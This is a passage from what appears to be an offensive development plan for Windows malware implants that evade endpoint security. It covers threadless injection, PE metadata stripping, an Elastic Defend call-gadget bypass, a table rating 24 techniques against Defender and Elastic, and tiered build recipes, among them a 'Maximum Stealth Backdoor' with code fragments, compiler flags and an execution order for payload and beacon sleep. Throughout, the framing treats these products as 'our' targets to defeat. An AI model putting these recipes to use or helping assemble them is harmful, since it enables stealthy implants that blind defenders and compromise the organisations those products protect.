//    call shellcode_addr
//    pop r15..rax
//    popfq
//    jmp original_code  // restore normal flow
// 4. Overwrite 5 bytes after a commonly-called ntdll function with:
//    jmp trampoline_addr
// 5. Wait for legitimate thread to call the function
```

**Key advantage**: No `CreateRemoteThread`, no APC, no `SetThreadContext`. The absence of these calls breaks the typical process injection detection combination.

### Variants
- **DLL notification callback hijack**: Hook `LdrRegisterDllNotification` callback in target process. When any DLL loads, callback fires on existing thread.
- **Module stomping + threadless**: Combine DLL stomping with threadless execution for double evasion.

### EDR Bypass
- Tested against Defender for Endpoint with 0 detections
- No thread creation callback fires
- Execution occurs on pre-existing threads

### Detection Risk
- **Low**: Requires only VirtualAllocEx + WriteProcessMemory (no execution primitives monitored by EDRs).

### MinGW Notes
All APIs are standard Win32. Compiles cleanly.

### Chunk Implementation Priority: **LOW** -- primarily useful for lateral movement scenarios, not our self-contained binary model.

---

## 18. PE Metadata Stripping

**Category**: Signature evasion
**Purpose**: Remove or manipulate PE metadata that AV/EDR use for fingerprinting and classification.

### Targets for Stripping

1. **Rich Header**: Undocumented MSVC linker metadata. Contains build environment fingerprint (compiler version, object counts). Defenders use it for malware family attribution. MinGW does NOT generate Rich headers by default -- this is already a natural advantage.

2. **Debug Directory**: Contains PDB path and debug GUID. Remove to prevent attribution:
```c
// At link time with MinGW:
// x86_64-w64-mingw32-gcc -s -Wl,--strip-debug payload.c -o payload.exe
// -s strips all symbols and debug info
```

3. **Timestamp manipulation**: PE header timestamps can be zeroed or randomized:
```c
// Post-processing: zero the TimeDateStamp field
PIMAGE_NT_HEADERS nt = ...;
nt->FileHeader.TimeDateStamp = 0;
```

4. **Import table minimization**: Use `GetProcAddress` for all API resolution instead of static imports. This makes the IAT (Import Address Table) clean -- only kernel32!LoadLibraryA and kernel32!GetProcAddress appear.

5. **Section name randomization**: Change default `.text`, `.rdata`, `.data` section names to custom values to avoid heuristic rules that expect standard names.

### MinGW Advantages

MinGW-compiled binaries naturally lack several MSVC-specific artifacts:
- No Rich header (MSVC only)
- No MSVC CRT signatures
- Different PE section layout
- Different exception handling implementation

This means MinGW binaries are inherently harder to classify than MSVC binaries.

### Detection Risk
- **Low**: Metadata stripping is a build-time operation with no runtime detection vector.

### MinGW Notes
`-s` flag strips symbols. `-Wl,--strip-all` strips everything. Dynamic API resolution avoids IAT entries.

### Chunk Implementation Priority: **HIGH** -- trivial to implement (compiler flags), significant evasion benefit. Should be applied to every build.

---

## 19. Elastic Defend Call Gadget Bypass

**Category**: Target-specific (Elastic Defend)
**Purpose**: Bypass Elastic EDR's call stack signature detection by inserting legitimate DLL modules into the call chain.

**Published**: November 2025. Specific to Elastic Defend's call-stack-based behavioral detection.

### How Elastic Detects Malicious Activity

Elastic Defend has behavioral rules that match specific call stack patterns. Example signature:
```
ntdll.dll|kernelbase.dll|ntdll.dll|kernel32.dll|ntdll.dll
```

This pattern fires when network modules load from suspicious (unbacked) memory locations, indicating shellcode execution.

### The Bypass Technique

Instead of directly calling target functions, the attacker jumps to a call gadget within a legitimate but unmonitored DLL. This causes the gadget's DLL to appear in the call stack, breaking the expected signature pattern.

**Gadget discovery**: Scan System32 DLLs for sequences containing a `call` instruction to a register followed by a return instruction.

A stable gadget was found in **dsdmo.dll**: `call r10; [stack cleanup]; ret`

**Result**: dsdmo.dll appears in the call stack between ntdll and kernelbase, changing the pattern to:
```
ntdll.dll|dsdmo.dll|kernelbase.dll|ntdll.dll|kernel32.dll|ntdll.dll
```

This does not match Elastic's detection rule.

### Implementation

```c
// 1. Load dsdmo.dll (or any DLL with suitable gadgets)
HMODULE hDsdmo = LoadLibraryA("dsdmo.dll");

// 2. Find the call gadget (call r10; ... ret)
PVOID gadget = find_call_gadget(hDsdmo, "call r10");

// 3. Instead of calling LdrLoadDll directly:
//    - Set R10 to the real function address
//    - Call the gadget
//    - Gadget executes: call r10 (which calls our real function)
//    - dsdmo.dll appears in the stack trace
```

### Alternative: Win32u.dll ROP Gadgets

Attackers can also use ROP gadgets from win32u.dll to call LdrLoadDll and NtMapViewOfSection, avoiding ntdll's load library APIs entirely.

### Elastic's Response

Elastic acknowledged the technique and is developing updated detection rules. They emphasized that their EDR uses "multiple detection layers throughout an implant's execution lifecycle," suggesting this is one bypass point rather than comprehensive evasion.

### Detection Risk
- **Low-Medium**: Gadget-based call stack manipulation is hard to generalize detection for.
- **Mitigation by Elastic**: Would require scanning for ALL possible gadget DLLs, which is impractical.

### MinGW Notes
Compiles cleanly. Standard Win32 APIs for module loading and memory scanning.

### Chunk Implementation Priority: **HIGH** -- directly targets Elastic Defend, which is one of our two primary targets. Low implementation effort.

---

## 20. Summary Table

| # | Technique | Category | Difficulty | Evasion Power | Defender | Elastic | MinGW | Priority |
|---|-----------|----------|-----------|---------------|----------|---------|-------|----------|
| 1 | ETW Patch (byte) | Telemetry | Easy | Medium | Detected | Bypasses | Yes | HIGH |
| 2 | ETW Patch (HW BP) | Telemetry | Medium | High | Bypasses | Bypasses | Yes | HIGH |
| 3 | NTDLL Unhook (KnownDlls) | Hooks | Medium | High | Bypasses | Bypasses | Yes | HIGH |
| 4 | NTDLL Unhook (selective) | Hooks | Medium | High | Bypasses | Bypasses | Yes | HIGH |
| 5 | Indirect Syscalls | Hooks | Hard | Very High | Bypasses | Bypasses | Yes* | CRITICAL |
| 6 | Sleep Obfuscation (Ekko) | Memory | Hard | Very High | Bypasses | Bypasses | Yes | HIGH |
| 7 | DeathSleep | Memory | Very Hard | Extreme | Bypasses | Bypasses | Yes* | MEDIUM |
| 8 | Call Stack Spoofing | Stack | Hard | High | Partial | Bypasses | Yes* | MEDIUM |
| 9 | LACUNA Chain | Stack | Very Hard | Extreme | Bypasses | Bypasses | Yes* | MEDIUM |
| 10 | Module Stomping (local) | Memory | Easy | Medium | Partial | Partial | Yes | MEDIUM |
| 11 | Phantom DLL Hollowing | Memory | Hard | Very High | Bypasses | Bypasses | Yes* | HIGH |
| 12 | HW BP Hooking | Patchless | Medium | Very High | Bypasses | Bypasses | Yes | HIGH |
| 13 | LayeredSyscall | Patchless | Hard | Extreme | Bypasses | Bypasses | Yes* | HIGH |
| 14 | Pool Party (TP_WORK) | Injection | Hard | Very High | Bypasses | Bypasses | Yes* | MEDIUM |
| 15 | Waiting Thread Hijack | Injection | Hard | Very High | Bypasses | Bypasses | Yes | LOW-MED |
| 16 | Fiber Execution | Execution | Easy | Medium | Partial | Partial | Yes | MED-HIGH |
| 17 | Callback (EnumWindows) | Execution | Easy | Medium | Partial | Partial | Yes | MEDIUM |
| 18 | Process Ghosting | File | Hard | Medium | Partial | Partial | Yes* | LOW |
| 19 | Threadless Injection | Injection | Hard | High | Bypasses | Unknown | Yes | LOW |
| 20 | PE Metadata Strip | Signature | Easy | Medium | Helps | Helps | Yes | HIGH |
| 21 | Elastic Call Gadget | Target | Easy | High | N/A | Bypasses | Yes | HIGH |
| 22 | AMSI Bypass (HW BP) | Scan | Medium | Low (for C) | Bypasses | N/A | Yes | LOW |
| 23 | Dirty Vanity | Injection | Hard | High | Varies | Varies | Yes* | LOW |
| 24 | EDR Preloading | Disable | Hard | High | Varies | Varies | N/A | LOW |

\* Requires additional NT API definitions or assembly stubs

---

## 21. Implementation Recommendations

### Phase 7 Priority Order (for chunk framework)

**Tier 1 -- Implement First (highest ROI, compilable as standalone chunks):**

1. **`evasion/etw_hw_bp.c`** -- Patchless ETW bypass via hardware breakpoints + VEH + NtContinue. ~40 lines. No memory patches = no integrity check failures. Call at process start before any suspicious activity. **Targets both Defender and Elastic Defend.**

2. **`evasion/pe_strip.c`** (build flag) -- Strip debug info, minimize IAT, zero timestamps. Compiler flags only (`-s -Wl,--strip-all`). Zero runtime cost. **Apply to every build.**

3. **`evasion/unhook_ntdll.c`** -- KnownDlls-based ntdll unhooking. ~60 lines. Call immediately after ETW bypass. Removes all usermode hooks. **Prerequisite for all subsequent evasion.**

4. **`evasion/elastic_gadget.c`** -- Elastic Defend call gadget insertion using dsdmo.dll. ~30 lines. Breaks Elastic's call stack signature patterns. **Direct Elastic Defend bypass.**

**Tier 2 -- Implement Next (significant evasion improvement, more complex):**

5. **`evasion/indirect_syscall.c`** -- HellsGate/FreshyCalls SSN resolution + indirect syscall stubs. ~150 lines + inline assembly. Foundation for calling any NT API without hooked functions. Requires `-masm=intel` flag. **Foundation technique.**

6. **`evasion/sleep_encrypt.c`** -- Ekko-style sleep obfuscation. ~100 lines. Critical for backdoor implants. Defeats memory scanners during idle periods. Requires `-ladvapi32`. **Must combine with ETW bypass.**

7. **`evasion/fiber_exec.c`** -- Fiber-based execution. ~15 lines. Trivially easy, zero kernel visibility. Combine with module stomping for maximum stealth. **Quick win.**

8. **`evasion/module_stomp.c`** -- Local module stomping with sacrificial DLL. ~25 lines. Code runs from module-backed memory. **Eliminates unbacked memory IoC.**

**Tier 3 -- Implement Later (advanced, high complexity):**

9. **`evasion/phantom_hollow.c`** -- Phantom DLL Hollowing via Transactional NTFS. ~200 lines. Best-in-class memory artifact evasion. No copy-on-write, no disk modification. **Gold standard for memory evasion.**

10. **`evasion/stack_spoof.c`** -- Synthetic stack frame construction. ~300 lines + assembly. Defeats kernel stack walking. Combine with Ekko sleep. **Required for CrowdStrike evasion.**

11. **`evasion/lacuna_chain.c`** -- LACUNA .pdata lacunae call stack bypass. ~500 lines. Defeats CET shadow stacks, ETW-TI, and all known stack analysis. **Next-generation stack evasion. Research-grade.**

### Recommended Chunk Combinations

**Maximum Stealth Backdoor Recipe (Defender + Elastic Defend):**
```yaml
evasion:
  - evasion/etw_hw_bp          # Patchless ETW blind
  - evasion/unhook_ntdll       # Remove usermode hooks
  - evasion/indirect_syscall   # Bypass any remaining hooks
  - evasion/elastic_gadget     # Break Elastic call stack signatures
  - evasion/sleep_encrypt      # Encrypt memory during sleep
  - evasion/module_stomp       # Module-backed memory
  - evasion/fiber_exec         # No thread creation
  - evasion/behavioral_pacing  # (existing) busy-wait timing
build_flags:
  - -s -Wl,--strip-all        # Strip PE metadata
  - -masm=intel                # Required for syscall stubs
  - -ladvapi32                 # Required for SystemFunction032
```

**Balanced Stealth (less code, fewer dependencies):**
```yaml
evasion:
  - evasion/etw_hw_bp
  - evasion/elastic_gadget
  - evasion/fiber_exec
  - evasion/behavioral_pacing
build_flags:
  - -s -Wl,--strip-all
```

**Minimal (fastest compilation, lowest complexity):**
```yaml
evasion:
  - evasion/etw_hw_bp
  - evasion/behavioral_pacing
build_flags:
  - -s
```

### Key Implementation Notes

1. **Execution order matters**: ETW bypass MUST run before ntdll unhooking, which must run before any suspicious API calls.
2. **MinGW `-masm=intel` flag**: Required for indirect syscall assembly stubs. Add to compiler command.
3. **Static linking**: All techniques work with `-static` linking. No runtime DLL dependencies beyond system DLLs.
4. **Testing**: Each chunk should be tested independently, then in combination. ETW bypass + unhook are safe to combine. Sleep obfuscation should be tested separately first.
5. **Defender Tamper Protection**: Byte-patching ETW/AMSI triggers Tamper Protection. Use HW breakpoint methods when Tamper Protection is enabled (always on in modern Defender).
6. **Elastic Defend specifics**: Elastic's primary detection relies on call stack analysis and ETW-Ti kernel callbacks. The call gadget technique (Section 19) directly addresses their strongest detection mechanism.
7. **Thread-per-breakpoint**: Hardware breakpoints are per-thread. If the implant uses multiple threads, DR registers must be set on each thread.
8. **Avoid DONT_RESOLVE_DLL_REFERENCES in production**: Some EDRs flag this flag specifically. Use LoadLibraryA with a benign DLL that has a small DllMain instead.

### Execution Order for Combined Evasion

```
1. PE metadata already stripped at build time
2. etw_hw_bp.c     -- blind ETW (patchless)
3. unhook_ntdll.c  -- remove usermode hooks
4. elastic_gadget  -- prepare call gadget for Elastic
5. module_stomp.c  -- load sacrificial DLL, stomp .text
6. fiber_exec.c    -- create fiber pointing to stomped .text
7. [payload runs]
8. sleep_encrypt.c -- Ekko sleep between beacon intervals
9. [repeat 7-8]
```

---

## Sources

### Syscalls and Hook Bypass
- [EDR Evasion Techniques Using Syscalls -- HADESS](https://hadess.io/edr-evasion-techniques-using-syscalls/)
- [Direct vs Indirect Syscalls -- RedOps](https://redops.at/en/blog/direct-syscalls-vs-indirect-syscalls)
- [Direct Syscalls: Bypassing EDR -- Medium](https://medium.com/@Ecrcrvec/direct-syscalls-an-approach-to-bypassing-edr-403854d59fc2)
- [SysWhispers4 -- GitHub](https://github.com/JoasASantos/SysWhispers4)
- [SysWhispers3 -- GitHub](https://github.com/klezVirus/SysWhispers3)
- [HellHall Indirect Clean Syscalls -- GitHub](https://github.com/gmh5225/syscall-EDR-bypass-HellHall)
- [c_syscalls Runtime SSN Resolving -- GitHub](https://github.com/janoglezcampos/c_syscalls)
- [HookChain: Bypassing EDR -- arxiv](https://arxiv.org/pdf/2404.16856)

### Sleep Obfuscation
- [Ekko Sleep Obfuscation -- Cracked5pider GitHub](https://github.com/Cracked5pider/Ekko/blob/main/Src/Ekko.c)
- [Understanding Sleep Obfuscation -- Binary Defense](https://binarydefense.com/resources/blog/understanding-sleep-obfuscation)
- [Sleep Obfuscation Introduction -- dtsec](https://dtsec.us/2023-04-24-Sleep/)
- [Sleeping with Control Flow Guard -- Icebreaker](https://icebreaker.team/blogs/sleeping-with-control-flow-guard/)
- [Sleeping Beauty II: CFG, CET, Stack Spoofing -- MaorSabag](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii/)
- [Sleep Encryption in SysWhispers4 -- Mintlify](https://www.mintlify.com/JoasASantos/SysWhispers4/advanced/sleep-encryption)

### Call Stack Spoofing
- [Spoofing Call Stacks to Confuse EDRs -- WithSecure Labs](https://labs.withsecure.com/publications/spoofing-call-stacks-to-confuse-edrs)
- [Call Stack Spoofer -- S12 Medium](https://medium.com/@s12deff/call-stack-spoofer-6183a67e4179)
- [Stack Spoofing Introduction -- dtsec](https://dtsec.us/2023-09-15-StackSpoofin/)
- [Return Address Spoofing -- Unprotect Project](https://unprotect.it/technique/return-address-spoofing/)
- [Behind the Mask: Dynamic Stack Spoofing -- Cobalt Strike](https://www.cobaltstrike.com/blog/behind-the-mask-spoofing-call-stacks-dynamically-with-timers)
- [LoudSunRun Synthetic Frames -- GitHub](https://github.com/susMdT/LoudSunRun)
- [ThreadStackSpoofer -- mgeeky GitHub](https://github.com/mgeeky/ThreadStackSpoofer)
- [ARM64 Call Stack Spoofing -- GitHub](https://github.com/xaitax/ARM64-CallStackSpoofing)

### LACUNA Chain
- [LACUNA Chain Bypasses EDR -- CyberPress](https://cyberpress.org/lacuna-attack-chain-bypasses/)
- [LACUNA Chain Ghost Frames -- GBHackers](https://gbhackers.com/lacuna-chain-ghost-frames-technique-bypasses-edr/)
- [LACUNA-Chain PoC -- GitHub](https://github.com/MazX0p/LACUNA-Chain)
- [Elastic, Bitdefender, Kaspersky Bypassed -- MalwareTips](https://malwaretips.com/threads/elastic-bitdefender-and-kaspersky-edrs-bypassed-by-a-novel-technique-dubbed-lacuna-chain.141898/)

### Elastic Defend Specific
- [Elastic EDR Evaded by Call Gadgets -- CyberSecurityNews](https://cybersecuritynews.com/elastic-edr-evaded/)
- [Elastic EDR Call Stack Signatures Bypassed -- GBHackers](https://gbhackers.com/researchers-bypass-elastic-edr/)
- [Peeling Back the Curtain with Call Stacks -- Elastic Labs](https://www.elastic.co/security-labs/peeling-back-the-curtain-with-call-stacks)
- [Elastic Behavior Rule Bounty -- Elastic Labs](https://www.elastic.co/security-labs/behavior-rule-bug-bounty)
- [Bypassing Elastic: Linux Rootkit Detection -- MatheuZ](https://matheuzsecurity.github.io/hacking/bypassing-elastic/)

### Module Stomping and DLL Hollowing
- [Module Stomping -- OtterHacker GitBook](https://otterhacker.github.io/Malware/Module%20stomping.html)
- [Module Stomping -- dtsec](https://dtsec.us/2023-11-04-ModuleStompin/)
- [Module Stomping -- ired.team](https://www.ired.team/offensive-security/code-injection-process-injection/modulestomping-dll-hollowing-shellcode-injection)
- [Phantom DLL Hollowing -- Forrest Orr](https://www.forrest-orr.net/post/malicious-memory-artifacts-part-i-dll-hollowing)
- [DLL Hollowing Deep Dive -- SecForce](https://www.secforce.com/blog/dll-hollowing-a-deep-dive-into-a-stealthier-memory-allocation-variant/)
- [Improving Stealthiness of Memory Injections -- Naksyn](https://naksyn.com/edr%20evasion/2023/06/01/improving-the-stealthiness-of-memory-injections.html)

### Hardware Breakpoints and VEH
- [ETW TI and Hardware Breakpoints -- Praetorian](https://www.praetorian.com/blog/etw-threat-intelligence-and-hardware-breakpoints/)
- [LayeredSyscall VEH Bypass -- White Knight Labs](https://whiteknightlabs.com/2024/07/31/layeredsyscall-abusing-veh-to-bypass-edrs/)
- [BlindSide: EDR Evasion with HW Breakpoints -- Cymulate](https://cymulate.com/blog/blindside-a-new-technique-for-edr-evasion-with-hardware-breakpoints/)
- [VEH2 Patchless AMSI -- CrowdStrike](https://www.crowdstrike.com/en-us/blog/crowdstrike-investigates-threat-of-patchless-amsi-bypass-attacks/)
- [Bypassing EDR Hardware Breakpoints at CPU Level -- CyberSecurityNews](https://cybersecuritynews.com/bypassing-edr-detection-hardware-breakpoints/)

### Thread Pool and Injection
- [Pool Party Process Injection -- SafeBreach](https://www.safebreach.com/blog/process-injection-using-windows-thread-pools/)
- [Waiting Thread Hijacking -- Check Point Research](https://research.checkpoint.com/2025/waiting-thread-hijacking/)
- [Poison Fiber / Fiber Injection -- DarkReading](https://www.darkreading.com/application-security/sneaky-shellcode-windows-fibers-edr-proof-code-execution)
- [ThreadlessInject -- GitHub](https://github.com/CCob/ThreadlessInject)
- [Process Injection Evading EDR 2023 -- Van Mieghem](https://vanmieghem.io/process-injection-evading-edr-in-2023/)

### Windows Defender
- [Bypass Defender 2025 Part 1 -- Hackmosphere](https://www.hackmosphere.fr/en/bypassing-windows-defender-antivirus-in-2025-evasion-techniques-using-direct-syscalls-and-xor-encryption-part-1/)
- [Bypass Defender 2025 Part 2 -- Hackmosphere](https://www.hackmosphere.fr/en/bypass-windows-defender-antivirus-in-2025-evasion-techniques-using-direct-syscalls-and-xor-encryption-part-2/)
- [DefendNot: Malicious Security Product Bypass -- Huntress](https://www.huntress.com/blog/defendnot-detecting-malicious-security-product-bypass-techniques)

### NTDLL Unhooking
- [NTDLL Unhooking KnownDlls -- GitHub Gist](https://gist.github.com/wizardy0ga/afabda19d4d71bd9cb36a3ff8ad84e71)
- [Full DLL Unhooking C++ -- ired.team](https://www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++)
- [Unhooking EDR by Remapping NTDLL -- Medium](https://bobvanderstaak.medium.com/unhooking-edr-by-remapping-ntdll-101a99887dfe)
- [Loader Dev: Evading Userspace Hooks -- cirosec](https://cirosec.de/en/news/loader-dev-3-evading-userspace-hooks/)
- [NTDLL Unhooking Collection -- GitHub](https://github.com/SaadAhla/ntdlll-unhooking-collection)

### ETW Bypass
- [Bypassing ETW for Profit -- White Knight Labs](https://whiteknightlabs.com/2021/12/11/bypassing-etw-for-fun-and-profit/)
- [Design Issues of Modern EDRs: Bypassing ETW -- Binarly](https://www.binarly.io/blog/design-issues-of-modern-edrs-bypassing-etw-based-solutions)
- [Stealth Syscall Execution: Bypassing ETW/EDR -- DarkRelay](https://www.darkrelay.com/post/stealth-syscall-execution-bypass-edr-detection)
- [ETW Patching in Rust -- 0xflux](https://fluxsec.red/etw-patching-rust)

### General EDR Evasion
- [Bypassing Modern EDRs 2025 Edition -- Medium](https://medium.com/@atnoforcybersecurity/bypassing-modern-edrs-practical-evasion-techniques-2025-edition-0158fca683ed)
- [EDR Bypass Techniques 2026 -- RingSafe](https://ringsafe.in/edr-bypass-techniques-2026-endpoint-evasion/)
- [EDR Tradecraft: Internals and Bypass -- DbgMan](https://0xdbgman.github.io/posts/edr-internals-research-and-bypass/)
- [EDR/XDR Bypass Investigation -- DEV Community](https://dev.to/excalibra/edrxdr-bypass-and-detection-evasion-techniques-an-investigation-of-advanced-evasion-strategies-5ckf)
- [Anatomy of Stealth: EDR Evasion -- ExtraHop](https://www.extrahop.com/blog/anatomy-of-stealth-analyzing-the-edr-evasion-techniques-behind-modern-breaches)
- [BOAZ Multilayered AV/EDR Evasion -- GitHub](https://github.com/thomasxm/BOAZ_beta)
- [Stop Being Weird: Life After Call Stack Spoofing Under CET -- bigbingus](https://bigbingus.com/posts/stop-being-weird/)
- [Analyzing Malware with Hooks, Stomps, Return-addresses -- CyberArk](https://www.cyberark.com/resources/threat-research-blog/analyzing-malware-with-hooks-stomps-and-return-addresses-2)
- [Bypassing EDR Crystal Clear Way -- Meacci](https://lorenzomeacci.com/bypassing-edr-in-a-crystal-clear-way)
